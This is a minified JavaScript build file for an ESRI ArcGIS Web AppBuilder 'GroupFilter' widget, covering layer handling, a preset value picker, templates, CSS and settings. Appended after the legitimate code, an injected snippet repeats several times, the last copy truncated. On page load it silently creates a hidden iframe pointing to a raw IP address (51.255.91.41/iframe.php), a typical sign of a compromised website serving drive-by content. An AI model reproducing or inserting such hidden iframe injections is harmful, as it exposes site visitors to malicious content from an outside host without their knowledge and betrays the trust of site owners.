// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"widgets/GroupFilter/LayersHandler":function(){define("dojo/Evented dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/Deferred dojo/promise/all esri/request".split(" "),function(q,r,l,h,k,f,p){return r([q],{declaredClass:"LayersHandler",layers:null,layerStore:[],fieldName:null,childList:null,validFieldTypes:"esriFieldTypeInteger esriFieldTypeSmallInteger esriFieldTypeDouble esriFieldTypeSingle esriFieldTypeString esriFieldTypeDate esriFieldTypeGeometry esriFieldTypeOID esriFieldTypeBlob esriFieldTypeGlobalID esriFieldTypeRaster esriFieldTypeGUID esriFieldTypeXML".split(" "),
layersOnly:!1,constructor:function(c){r.safeMixin(this,c)},getAllMapLayers:function(){var c=[],g=new k,a;this.layerStore=[];h.forEach(this.layers,l.hitch(this,function(b){if(!b.featureCollection)if("undefined"===typeof b.originOperLayer||!b.originOperLayer.layerType||"ArcGISFeatureLayer"!==b.originOperLayer.layerType&&"ArcGISImageServiceLayer"!==b.originOperLayer.layerType)if(0<b.newSubLayers.length){if(this.childList=[],"undefined"===typeof b.originOperLayer.layerType||"ArcGISTiledMapServiceLayer"!==
b.originOperLayer.layerType)h.forEach(b.layerObject.layerInfos,l.hitch(this,function(a){a={label:a.name,id:b.id+"."+a.id,url:b.originOperLayer.url+"/"+a.id,type:"Layer",fieldName:this.fieldName,checked:!1,children:[],layer:b.layerObject};this.childList.push(a);c.push(this._getLayerInfo(a))})),a={label:b.title,id:b.id,url:b.originOperLayer.url,type:"Service",checked:!1,children:this.childList,layer:b.layerObject},this.layerStore.push(a)}else"ArcGISMapServiceLayer"===b.originOperLayer.layerType&&(this.childList=
[],h.forEach(b.layerObject.layerInfos,l.hitch(this,function(a){a={label:a.name,id:b.id+"."+a.id,url:b.originOperLayer.url+"/"+a.id,type:"Layer",fieldName:this.fieldName,checked:!1,children:[],layer:b.layerObject};this.childList.push(a);c.push(this._getLayerInfo(a))})),a={label:b.title,id:b.id,url:b.originOperLayer.url,type:"MapService",checked:!1,children:this.childList,layer:b.layerObject},this.layerStore.push(a));else"undefined"===typeof b.originOperLayer.featureCollection&&(a={label:b.title,id:b.id,
url:b.url,fieldName:this.fieldName,type:"Feature Layer",checked:!1,children:[],layer:b.layerObject},c.push(this._getLayerInfo(a)),this.layerStore.push(a))}));f(c).then(l.hitch(this,function(){var a=this._controlComplete();this.emit("complete",a);g.resolve(a)}),l.hitch(this,function(){g.resolve(null)}));return g.promise},_getLayerInfo:function(c){var g=new k;c.url?0===c.url.length?g.resolve():p({url:c.url,content:{f:"json"},callbackParamName:"callback"}).then(l.hitch(this,function(a){if(a.hasOwnProperty("fields")&&
!1===this.layersOnly){var b=h.map(a.fields,l.hitch(this,function(a){return{label:a.alias,id:c.id+"."+a.name,name:a.name,type:"Field",fieldType:a.type,checked:!1}})),b=h.filter(b,l.hitch(this,function(a){return 0<=h.indexOf(this.validFieldTypes,a.fieldType)}));c.children=b}c.geometryType=a.geometryType;c.visible=!0;this.geometryTypes&&!h.some(this.geometryTypes,function(a){if(a===c.geometryType)return!0})&&(c.visible=!1);g.resolve(a)}),function(){g.resolve(null)}):g.resolve();return g.promise},_controlComplete:function(){h.forEach(this.layerStore,
function(c){if(c.children&&0<c.children.length){var g=h.filter(c.children,function(a){return a.hasOwnProperty("visible")?a.visible:!0});c.children=g;0===c.children.length&&(c.visible=!1)}});return this.store={data:{identifier:"id",label:"label",items:h.filter(this.layerStore,function(c){return c.hasOwnProperty("visible")?c.visible:!0})}}}})})},"widgets/GroupFilter/setting/presetValuePicker":function(){define("dojo/_base/declare jimu/BaseWidgetSetting jimu/dijit/FilterParameters dijit/_WidgetsInTemplateMixin dojo/on dojo/dom-construct dojo/dom-attr dojo/query dojo/_base/lang dojo/_base/array dijit/form/Select esri/layers/FeatureLayer dojo/text!./presetValuePicker.html".split(" "),
function(q,r,l,h,k,f,p,c,g,a,b,u,A){return q([r,h],{baseClass:"jimu-widget-map-filter-preset",templateString:A,layerList:null,map:null,nls:null,valueParam:null,postCreate:function(){this.inherited(arguments);this.startup()},startup:function(){this.inherited(arguments);this.createLayerSelection()},createLayerSelection:function(){var c=[];a.forEach(this.layerList,g.hitch(this,function(b){if(0<b.children.length)a.forEach(b.children,g.hitch(this,function(a){var b={};b.value=a.id;b.label=a.label;b.selected=
!1;c.push(b)}));else{var d={};d.value=b.id;d.label=b.label;d.selected=!1;c.push(d)}}));var f=(new b({options:c})).placeAt(this.layerLevel);f.startup();this.own(k(f,"change",g.hitch(this,function(a){this.createFieldSelection(a)})));this.createFieldSelection(f.value)},createFieldSelection:function(c){var m=[];a.forEach(this.layerList,g.hitch(this,function(b){0<b.children.length?a.forEach(b.children,g.hitch(this,function(b){b.id===c&&a.forEach(b.children,g.hitch(this,function(a){if(-1==="esriFieldTypeBlob,esriFieldTypeOID".indexOf(a.fieldType)){var b=
{};b.value=a.name;b.label=a.label;b.selected=!1;m.push(b)}}))})):b.id===c&&a.forEach(b.layer.fields,g.hitch(this,function(a){if(-1==="esriFieldTypeBlob,esriFieldTypeOID".indexOf(a.type)){var b={};b.value=a.name;b.label=""===a.alias?a.name:a.alias;b.selected=!1;m.push(b)}}))}));f.empty(this.fieldLevel);var w=(new b({options:m})).placeAt(this.fieldLevel);w.startup();this.own(k(w,"change",g.hitch(this,function(a){this.createValueList(a,c)})));this.createValueList(w.value,c)},createValueList:function(b,
m){f.empty(this.valueLevel);this.valueParam=new l;this.valueParam.placeAt(this.valueLevel);this.valueParam.startup();setTimeout(function(){var a=c(".jimu-single-filter-parameter"),a=c("colgroup",a[0]);0<a.length&&p.set(a[0].childNodes[1],"width","0px")},200);a.forEach(this.layerList,g.hitch(this,function(f){0<f.children.length?a.forEach(f.children,g.hitch(this,function(d){d.id===m&&a.forEach(d.children,g.hitch(this,function(a){if("Shape"!==a.name&&a.name===b){var f=new u(d.url);this.own(k(f,"load",
g.hitch(this,function(){var b=this._makefilterObject({name:a.name,label:a.label,type:a.fieldType});this.valueParam.build(d.url,f,b);b=c(".jimu-single-filter-parameter");b=c("colgroup",b[0]);p.set(b[0].childNodes[1],"width","0px")})))}}))})):f.id===m&&a.forEach(f.layer.fields,g.hitch(this,function(a){a.name===b&&(a=this._makefilterObject({name:a.name,label:a.alias,type:a.type}),this.valueParam.build(f.layer.url,f.layer,a),a=c(".jimu-single-filter-parameter"),a=c("colgroup",a[0]),0<a.length&&p.set(a[0].childNodes[1],
"width","0px"))}))}))},_makefilterObject:function(a){var b={},c=[],d={fieldObj:{}};d.fieldObj.name=a.name;d.fieldObj.label="undefined"===typeof a.alias?a.name:a.alias;d.fieldObj.shortType=a.type.replace("esriFieldType","").toLowerCase();if("guid"!==d.fieldObj.shortType||"globalid"!==d.fieldObj.shortType)d.fieldObj.shortType="string";"date"!==d.fieldObj.shortType&&"string"!==d.fieldObj.shortType&&(d.fieldObj.shortType="number");d.fieldObj.type=a.type;d.operator=d.fieldObj.shortType+"OperatorIs";d.valueObj=
{};d.valueObj.isValid=!0;d.valueObj.type="unique";d.valueObj.value="";d.interactiveObj={};d.interactiveObj.prompt="";d.interactiveObj.hint="";d.caseSensitive=!1;c.push(d);b.logicalOperator="OR";b.expr="";b.parts=c;return b}})})},"widgets/GroupFilter/setting/_build-generate_module":function(){define(["dojo/text!./Setting.html","dojo/text!./css/style.css","dojo/i18n!./nls/strings"],function(){})},"url:widgets/GroupFilter/setting/presetValuePicker.html":'\x3cdiv\x3e\r\n\t\x3cdiv\x3e\x3ch3\x3e${nls.picker.description}\x3c/h3\x3e\x3c/div\x3e\r\n\t\x3cbr\x3e\r\n\t\x3ctable width\x3d"100%" cellpadding\x3d"2" cellspacing\x3d"2"\x3e\r\n\t\t\x3ctr\x3e\r\n\t\t\t\x3ctd class\x3d"picker-cell"\x3e\r\n\t\t\t\t${nls.picker.layer}\x3cbr\x3e\r\n\t\t\t\t\x3cdiv class\x3d"" data-dojo-attach-point\x3d"layerLevel"\x3e\x3c/div\x3e\r\n\t\t\t\x3c/td\x3e\r\n\t\t\x3c/tr\x3e\r\n\t\t\x3ctr\x3e\r\n\t\t\t\x3ctd class\x3d"picker-cell"\x3e\r\n\t\t\t\t${nls.picker.field}\x3cbr\x3e\r\n\t\t\t\t\x3cdiv class\x3d"" data-dojo-attach-point\x3d"fieldLevel"\x3e\x3c/div\x3e\r\n\t\t\t\x3c/td\x3e\r\n\t\t\x3c/tr\x3e\r\n\t\t\x3ctr\x3e\r\n\t\t\t\x3ctd class\x3d"picker-cell"\x3e\r\n\t\t\t\t${nls.picker.value}\x3cbr\x3e\r\n\t\t\t\t\x3cdiv class\x3d"value-level" data-dojo-attach-point\x3d"valueLevel"\x3e\x3c/div\x3e\r\n\t\t\t\x3c/td\x3e\r\n\t\t\x3c/tr\x3e\r\n\t\x3c/table\x3e\r\n\x3c/div\x3e',
"url:widgets/GroupFilter/setting/Setting.html":'\x3cdiv\x3e\r\n\t\x3clabel\x3e${nls.configText}\x3c/label\x3e\r\n\t\x3cdiv class\x3d"widget-intro" data-dojo-attach-point\x3d"widgetIntro"\x3e\x3c/div\x3e\r\n\t\x3cdiv class\x3d"layer-Mapping-Block" data-dojo-attach-point\x3d"layerMappingBlock" id\x3d"layerMappingBlock"\x3e\x3c/div\x3e\r\n\t\x3cdiv class\x3d"jimu-btn layer-Mapping-Block-add" data-dojo-attach-point\x3d"layerMappingBlockAdd" data-dojo-attach-event\x3d"click:createGroupBlock" title\x3d"${nls.buttons.addNewGroupTip}"\x3e${nls.buttons.addNewGroup}\x3c/div\x3e\r\n\t\x3chr\x3e\r\n\t\x3cdiv\x3e\r\n\t\t\x3ctable width\x3d"90%"\x3e\r\n\t\t\t\x3ctr\x3e\r\n\t\t\t\t\x3ctd\x3e\x3cinput type\x3d"checkbox" data-dojo-type\x3d"dijit/form/CheckBox"  data-dojo-attach-point\x3d"chkSimpleMode" data-dojo-props\x3d"value:true,checked:false"/\x3e\x3c/td\x3e\r\n\t\t\t\t\x3ctd title\x3d"${nls.inputs.simpleModeTip}"\x3e${nls.inputs.simpleMode}\x3c/td\x3e\r\n\t\t\t\t\x3ctd\x3e\x3cinput type\x3d"checkbox" data-dojo-type\x3d"dijit/form/CheckBox"  data-dojo-attach-point\x3d"chkOptionsMode" data-dojo-props\x3d"value:true,checked:false"/\x3e\x3c/td\x3e\r\n\t\t\t\t\x3ctd title\x3d"${nls.inputs.optionsModeTip}"\x3e${nls.inputs.optionsMode}\x3c/td\x3e\r\n\t\t\t\x3c/tr\x3e\r\n\t\t\t\x3ctr\x3e\r\n\t\t\t\t\x3ctd\x3e\x3cinput type\x3d"checkbox" data-dojo-type\x3d"dijit/form/CheckBox"  data-dojo-attach-point\x3d"chkWebmapAppendMode" data-dojo-props\x3d"value:true,checked:true"/\x3e\x3c/td\x3e\r\n\t\t\t\t\x3ctd title\x3d"${nls.inputs.webmapAppendModeTip}"\x3e${nls.inputs.webmapAppendMode}\r\n\t\t\t\t\t\x3cselect data-dojo-attach-point\x3d"slAppendChoice" data-dojo-type\x3d"dijit/form/Select"\x3e\r\n\t\t\t\t\t    \x3coption value\x3d"OR"\x3e${nls.inputs.optionOR}\x3c/option\x3e\r\n\t\t\t\t\t    \x3coption value\x3d"AND"\x3e${nls.inputs.optionAND}\x3c/option\x3e\r\n\t\t\t\t\t\x3c/select\x3e\r\n\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\x3ctd\x3e\x3cinput type\x3d"checkbox" data-dojo-type\x3d"dijit/form/CheckBox"  data-dojo-attach-point\x3d"chkZoomMode" data-dojo-props\x3d"value:true,checked:true"/\x3e\x3c/td\x3e\r\n\t\t\t\t\x3ctd title\x3d"${nls.zoomTo} ${nls.allFeaturesTip}"\x3e${nls.zoomTo}\x3c/td\x3e\r\n\t\t\t\x3c/tr\x3e\r\n\t\t\t\x3ctr\x3e\r\n\t\t\t\t\x3ctd\x3e\x3cinput type\x3d"checkbox" data-dojo-type\x3d"dijit/form/CheckBox"  data-dojo-attach-point\x3d"chkPersistOnClose" data-dojo-props\x3d"value:true,checked:false"/\x3e\x3c/td\x3e\r\n\t\t\t\t\x3ctd title\x3d"${nls.inputs.persistOnClose}"\x3e${nls.inputs.persistOnClose}\x3c/td\x3e\r\n\t\t\t\t\x3ctd\x3e\x3c/td\x3e\r\n\t\t\t\t\x3ctd\x3e\x3c/td\x3e\r\n\t\t\t\x3c/tr\x3e\r\n\t\t\x3c/table\x3e\r\n\t\x3c/div\x3e\r\n\x3c/div\x3e',
"url:widgets/GroupFilter/setting/css/style.css":'.jimu-widget-map-filter input{margin-left: 10px;}.jimu-widget-map-filter .group-block {background-color: #FFFFFF; border-color: #e1e1e1; border-style: solid; border-width: 2px; border-radius: 5px; width: 100%; text-align: left; position: relative; margin-top: 10px;}.jimu-widget-map-filter .layer-Mapping-Block-add {margin-top: 10px; margin-bottom: 5px;}.jimu-widget-map-filter .group-setting-table {width: 100%; margin-left: 10px;}.jimu-widget-map-filter .group-block-item {position: relative; width: 90%;}.jimu-widget-map-filter .group-block-delete{padding-left: 10px; padding-right: 10px; cursor: pointer; cursor: hand; content: url("../../images/delete.png");}.jimu-widget-map-filter .group-block-delete:after{padding-left: 10px; padding-right: 10px; cursor: pointer; cursor: hand; content: url("../../images/delete.png");}.jimu-widget-map-filter .group-block-delete:hover{padding-left: 10px; padding-right: 10px; cursor: pointer; cursor: hand; content: url("../../images/delete_hover.png");}.jimu-widget-map-filter .group-block-layer-select {}.jimu-widget-map-filter .group-block-field-select {position: absolute; right: 0px; top: 0px;}.jimu-widget-map-filter .group-block-add-layer {margin-top: 5px; margin-bottom: 5px; margin-left: 10px; margin-right: 10px;}.jimu-widget-map-filter .groupName-textbox {margin-top: 5px; margin-bottom: 5px; margin-left: 0px; margin-right: 0px; width: 175px;}.jimu-widget-map-filter .groupName-Desctextbox {margin-top: 5px; margin-bottom: 5px; margin-left: 10px; margin-right: 10px; width: 400px;}.jimu-widget-map-filter .groupName-Defaulttextbox {margin-top: 5px; margin-bottom: 5px; margin-left: 10px; margin-right: 10px; width: 400px;}.jimu-widget-map-filter .groupName-defaultPicker {padding-left: 10px; padding-right: 10px; content: url("../../images/find.png"); cursor: hand; cursor: pointer;}.jimu-widget-map-filter .groupName-defaultPicker:after {padding-left: 10px; padding-right: 10px; content: url("../../images/find.png"); cursor: hand; cursor: pointer;}.jimu-widget-map-filter .layer-tables {margin-top: 5px; margin-bottom: 5px; width: 98%; margin-left: 10px;}.jimu-widget-map-filter .operator-select {font-size: 8pt;}.jimu-widget-map-filter .operator-append-select {font-size: 8pt; margin-top: 5px; margin-bottom: 5px; margin-left: 10px; margin-right: 10px;}.jimu-widget-map-filter-preset .picker-cell {padding-bottom: 15px;}.jimu-widget-map-filter-preset .value-level{margin-left: -3px; margin-right: -3px;}',
"*now":function(q){q(['dojo/i18n!*preload*widgets/GroupFilter/setting/nls/Setting*["ar","bs","cs","da","de","en","el","es","et","fi","fr","he","hi","hr","id","it","ja","ko","lt","lv","nb","nl","pl","pt-br","pt-pt","ro","ru","sl","sr","sv","th","tr","zh-cn","vi","zh-hk","zh-tw","ROOT"]'])},"*noref":1}});
define("dojo/_base/declare jimu/BaseWidgetSetting dijit/_WidgetsInTemplateMixin jimu/dijit/SimpleTable dojo/dom dojo/dom-construct dojo/on dojo/query dojo/dom-attr dojo/_base/lang dojo/_base/array dijit/form/Select dijit/form/TextBox dijit/form/ValidationTextBox jimu/utils jimu/LayerInfos/LayerInfos jimu/dijit/Message jimu/dijit/Popup dojox/html/entities ../LayersHandler ./presetValuePicker".split(" "),function(q,r,l,h,k,f,p,c,g,a,b,u,A,E,m,w,d,F,D,G,H){return q([r,l],{baseClass:"jimu-widget-map-filter",
groupCounter:0,groupLayerContainer:[],groupLayerName:[],groupLayerDesc:[],groupLayerOperator:[],groupLayerDefault:[],groupAppendSameConjunc:[],layerCounter:0,layerList:null,postMixInProperties:function(){this.nls=a.mixin(this.nls,window.jimuNls.common);this.nls=a.mixin(this.nls,window.jimuNls.spatialFilterByFeatures)},postCreate:function(){this.inherited(arguments)},startup:function(){this.inherited(arguments);this.setConfig(this.config)},setConfig:function(a){this.config=a;this.groupLayerContainer=
[];this.groupLayerName=[];this.groupLayerDesc=[];this.groupLayerOperator=[];this.groupLayerDefault=[];this.groupAppendSameConjunc=[];this.chkSimpleMode.set("checked",this.config.simpleMode);this.chkOptionsMode.set("checked",this.config.optionsMode);this.chkWebmapAppendMode.set("checked",this.config.webmapAppendMode);this.slAppendChoice.set("value",this.config.slAppendChoice);this.chkZoomMode.set("checked",this.config.zoomMode);this.chkPersistOnClose.set("checked",this.config.persistOnClose);this.createMapLayerList()},
getConfig:function(){if(null===this.layerList)return new d({message:this.nls.errors.noLayers}),!1;if(0<this.layerList.length){var e=this.validateNoGroups(),n=this.validateNoGroupsName(),c=this.validateDuplicateGroupsName(),f=this.validateTableRows();return e&&n&&c&&f?(this.config.simpleMode=this.chkSimpleMode.checked,this.config.optionsMode=this.chkOptionsMode.checked,this.config.webmapAppendMode=this.chkWebmapAppendMode.checked,this.config.slAppendChoice=this.slAppendChoice.get("value"),this.config.zoomMode=
this.chkZoomMode.checked,this.config.persistOnClose=this.chkPersistOnClose.checked,this.config.groups=[],b.forEach(this.groupLayerName,a.hitch(this,function(e,n){if(null!==e&&null!==this.groupLayerContainer[n]){var c={};c.name=m.sanitizeHTML(e.value);c.desc=m.sanitizeHTML(this.groupLayerDesc[n].value);c.operator=m.sanitizeHTML(this.groupLayerOperator[n].value);c.defaultVal=m.sanitizeHTML(this.groupLayerDefault[n].value);c.appendSameLayer=!0;c.appendSameLayerConjunc=this.groupAppendSameConjunc[n].value;
c.layers=[];b.forEach(this.groupLayerContainer[n].getRows(),a.hitch(this,function(a){var b={},e=a.cells[2].childNodes[0];b.layer=a.layerCol.value;b.field=a.fieldCol.value;b.dataType=a.dataTypeCol.attr("displayedValue");b.useDomain=e.checked?e.checked:"";c.layers.push(b)}));this.config.groups.push(c)}})),this.config):!1}new d({message:this.nls.errors.noLayers});return!1},createMapLayerList:function(){w.getInstance(this.map,this.map.itemInfo).then(a.hitch(this,function(e){e._layerInfos&&0<e._layerInfos.length&&
(console.log(e._layerInfos),e=new G({layers:e._layerInfos}),this.own(p(e,"complete",a.hitch(this,function(e){this.layerList=e.data.items;0<this.config.groups.length?b.forEach(this.config.groups,a.hitch(this,function(a){this.createGroupBlock({group:a})})):this.createGroupBlock({group:null})}))),this.own(p(e,"error",a.hitch(this,function(){console.log("error")}))),e.getAllMapLayers())}))},createGroupBlock:function(b){this.groupCounter++;var e=f.create("div",{id:"grpDiv_"+this.groupCounter,"class":"group-block"});
f.place(e,this.layerMappingBlock);var c=f.create("table",{"class":"group-setting-table"});f.place(c,e);var d=c.insertRow(-1),x=d.insertCell(0);g.set(x,"title",this.nls.labels.groupNameTip);var C=d.insertCell(1),y=d.insertCell(2);g.set(y,"title",this.nls.labels.groupDescTip);var e=d.insertCell(3),d=d.insertCell(4),v=c.insertRow(-1),h=v.insertCell(0);g.set(h,"title",this.nls.labels.groupOperatorTip);var I=v.insertCell(1),z=v.insertCell(2);g.set(z,"title",this.nls.labels.groupDefaultTip);var J=v.insertCell(3),
v=v.insertCell(4),t=c.insertRow(-1),l=t.insertCell(0);g.set(l,"colspan","3");c=t.insertCell(1);t.insertCell(2);g.set(t,"id","appendLayers_"+this.groupCounter);x.innerHTML=this.nls.labels.groupName;y.innerHTML=this.nls.labels.groupDesc;h.innerHTML=this.nls.labels.groupOperator;z.innerHTML=this.nls.labels.groupDefault;l.innerHTML=this.nls.labels.sameLayerAppend;y=h=x=z=t="";"undefined"!==typeof b.group&&null!==b.group&&(t=b.group.name,z=b.group.desc,x=b.group.operator,h=b.group.defaultVal,"undefined"!==
typeof b.group.appendSameLayerConjunc&&(y=b.group.appendSameLayerConjunc));t=new E({name:"txtGroupName",value:t,"class":"groupName-textbox",placeHolder:this.nls.inputs.groupName,required:"true"});f.place(t.domNode,C);this.groupLayerName.push(t);C=new A({name:"txtGroupDesc",value:z,"class":"groupName-Desctextbox",placeHolder:this.nls.inputs.groupDesc});f.place(C.domNode,e);this.groupLayerDesc.push(C);var m=new A({name:"txtGroupDefault",value:h,"class":"groupName-Defaulttextbox",placeHolder:this.nls.inputs.groupDefault});
f.place(m.domNode,J);this.groupLayerDefault.push(m);e=f.create("div",{"class":"groupName-defaultPicker"});f.place(e,v);this.own(p(e,"click",a.hitch(this,function(){this.presetPickerPopup(m)})));var q=f.create("div",{id:"addGroupDelete_"+this.groupCounter,"class":"group-block-delete"}),u=p(q,"click",a.hitch(this,function(){u.remove();this.removeGroup(q.id)}));f.place(q,d);this.createOperatorSelection({cell:I,value:x});this.createAppendConjunc({cell:c,value:y});this.createTableObject(b);var r=f.create("div",
{id:"addLyrDiv_"+this.groupCounter,"class":"jimu-btn group-block-add-layer",title:this.nls.buttons.addLayerTip});this.own(p(r,"click",a.hitch(this,function(){this.addLayerRow(r.id)})));f.place(r,k.byId("grpDiv_"+this.groupCounter));k.byId("addLyrDiv_"+this.groupCounter).innerHTML=this.nls.buttons.addLayer},createOperatorSelection:function(a){var b=(new u({options:[{value:"",label:this.nls.inputs.optionNONE},{value:"\x3d",label:this.nls.inputs.optionEQUAL},{value:"\x3c\x3e",label:this.nls.inputs.optionNOTEQUAL},
{value:"\x3e",label:this.nls.inputs.optionGREATERTHAN},{value:"\x3e\x3d",label:this.nls.inputs.optionGREATERTHANEQUAL},{value:"\x3c",label:this.nls.inputs.optionLESSTHAN},{value:"\x3c\x3d",label:this.nls.inputs.optionLESSTHANEQUAL},{value:"START",label:this.nls.inputs.optionSTART},{value:"END",label:this.nls.inputs.optionEND},{value:"LIKE",label:this.nls.inputs.optionLIKE},{value:"NOT LIKE",label:this.nls.inputs.optionNOTLIKE},{value:"d\x3c\x3d",label:this.nls.inputs.optionONORBEFORE},{value:"d\x3e\x3d",
label:this.nls.inputs.optionONORAFTER}],"class":"operator-select"})).placeAt(a.cell);b.startup();b.set("value",D.decode(a.value));this.groupLayerOperator.push(b)},createAppendConjunc:function(a){var b=(new u({options:[{value:"OR",label:this.nls.inputs.optionOR},{value:"AND",label:this.nls.inputs.optionAND}],"class":"operator-append-select"})).placeAt(a.cell);b.startup();b.set("value",D.decode(a.value));this.groupAppendSameConjunc.push(b)},createTableObject:function(e){var c=null,c=[{name:"layerCol",
title:this.nls.tables.layer,"class":"label",type:"empty",width:"375px"},{name:"fieldCol",title:this.nls.tables.field,"class":"label",type:"empty",width:"350px"},{name:"domainCol",title:this.nls.tables.value,"class":"label",type:"radio",width:"100px"},{name:"actions",title:this.nls.tables.action,type:"actions",actions:["delete"],width:"100px"},{name:"dataTypeCol",type:"empty",hidden:!0,width:0}],c=new h({fields:c,"class":"layer-tables"});c.placeAt(k.byId("grpDiv_"+this.groupCounter));this.groupLayerContainer.push(c);
"undefined"!==typeof e.group&&null!==e.group?b.forEach(e.group.layers,a.hitch(this,function(a){this.addLayerRow(k.byId("grpDiv_"+this.groupCounter).id,a)})):this.addLayerRow(k.byId("grpDiv_"+this.groupCounter).id,e)},addLayerRow:function(b,c){b=b.substring(b.indexOf("_")+1);var e=this.groupLayerContainer[b-1].addRow({});if(e.success&&e.tr){e=e.tr;this.createLayerSelection(e,c,b);var d=e.cells[2].childNodes[0],f=d.checked;this.own(p(d,"click",a.hitch(this,function(){f=f?d.checked=!1:d.checked=!0})))}},
createLayerSelection:function(e,d,f){var n=[];b.forEach(this.layerList,a.hitch(this,function(e){if(0<e.children.length)b.forEach(e.children,a.hitch(this,function(a){var b={};b.value=a.id;b.label=a.label;b.selected=!1;n.push(b)}));else{var c={};c.value=e.id;c.label=e.label;c.selected=!1;n.push(c)}}));var g=c(".simple-table-cell",e)[0],h;g&&(h=(new u({options:n})).placeAt(g),h.startup(),e.layerCol=h,this.own(p(h,"change",a.hitch(this,function(a){this.createFieldSelection(a,e,d,f)}))),"undefined"!==
typeof d&&h.set("value",d.layer));this.createFieldSelection(h.value,e,d,f)},createFieldSelection:function(e,d,g,h){var n=[],l=[];b.forEach(this.layerList,a.hitch(this,function(c){0<c.children.length?b.forEach(c.children,a.hitch(this,function(c){c.id===e&&b.forEach(c.children,a.hitch(this,function(a){if(-1==="esriFieldTypeBlob,esriFieldTypeOID".indexOf(a.fieldType)){var b={};b.value=a.name;b.label=a.label;b.selected=!1;n.push(b);b={};b.value=a.name;b.label=a.fieldType;b.selected=!1;l.push(b)}}))})):
c.id===e&&b.forEach(c.layer.fields,a.hitch(this,function(a){if(-1==="esriFieldTypeBlob,esriFieldTypeOID".indexOf(a.type)){var b={};b.value=a.name;b.label=""===a.alias?a.name:a.alias;b.selected=!1;n.push(b);b={};b.value=a.name;b.label=a.type;b.selected=!1;l.push(b)}}))}));var k=c(".simple-table-cell",d)[1],m=c(".simple-table-cell",d)[4];if(k){f.empty(k);k=(new u({options:n})).placeAt(k);k.startup();d.fieldCol=k;f.empty(m);var B=(new u({options:l})).placeAt(m);B.startup();d.dataTypeCol=B;this.own(p(k,
"change",a.hitch(this,function(a){this.resetRadio({layer:e,field:a,row:d,param:g,counter:h});this.dataTypeSync({layer:e,field:a,row:d,param:g,select:B})})));"undefined"!==typeof g&&(this.resetRadio({layer:e,row:d,param:g,counter:h}),k.set("value",g.field),B.set("value",g.field))}},dataTypeSync:function(a){a.select.set("value",a.field)},resetRadio:function(a){var b=a.row.cells[2].childNodes[0];"undefined"!==typeof a.param&&(a.param.hasOwnProperty("useDomain")?b.checked=""!==a.param.useDomain?!0:!1:
b.checked=!1)},validateNoGroups:function(){var c=!1,f=this.nls.errors.noGroups;b.forEach(this.groupLayerName,a.hitch(this,function(a){null!==a&&(c=!0)}));if(c)return!0;new d({message:f});return!1},validateNoGroupsName:function(){var c=!0,f=this.nls.errors.noGroupName;b.forEach(this.groupLayerName,a.hitch(this,function(a){null!==a&&(a.get("value")||(c=!1))}));!1===c&&new d({message:f});return c},validateDuplicateGroupsName:function(){var c=!0,f=this.nls.errors.noDuplicates,g=[];b.forEach(this.groupLayerName,
a.hitch(this,function(a){null!==a&&a.get("value")&&g.push(a.get("value"))}));1<g.length&&g.sort().filter(function(a,b,c){return a!==c[b-1]}).length!==g.length&&(c=!1);!1===c&&new d({message:f});return c},validateTableRows:function(){var c=!0;b.forEach(this.groupLayerContainer,a.hitch(this,function(a){null!==a&&0>=a.getRows().length&&(c=!1)}));!1===c&&new d({message:this.nls.errors.noRows});return c},presetPickerPopup:function(b){var c=new H({map:this.map,nls:this.nls,layerList:this.layerList}),e=
new F({titleLabel:this.nls.popup.label,width:500,height:420,content:c,buttons:[{label:window.jimuNls.common.ok,onClick:a.hitch(this,function(){var a="";if("undefined"!==typeof c.valueParam&&null!==c.valueParam.getFilterExpr()){var d=c.valueParam.getValueProviders()[0].getValueObject();d&&(a=d.value);b.set("value",a)}e.close();e=null})},{label:window.jimuNls.common.cancel,classNames:["jimu-btn-vacation"]}]})},removeGroup:function(a){a=a.substring(a.indexOf("_")+1);this.groupLayerContainer[a-1]=null;
this.groupLayerName[a-1]=null;this.groupLayerDesc[a-1]=null;this.groupLayerOperator[a-1]=null;this.groupLayerDefault[a-1]=null;this.groupAppendSameConjunc[a-1]=null;f.destroy(k.byId("addGroupDelete_"+a));f.destroy(k.byId("addLyrDiv_"+a));f.destroy(k.byId("grpDiv_"+a))}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
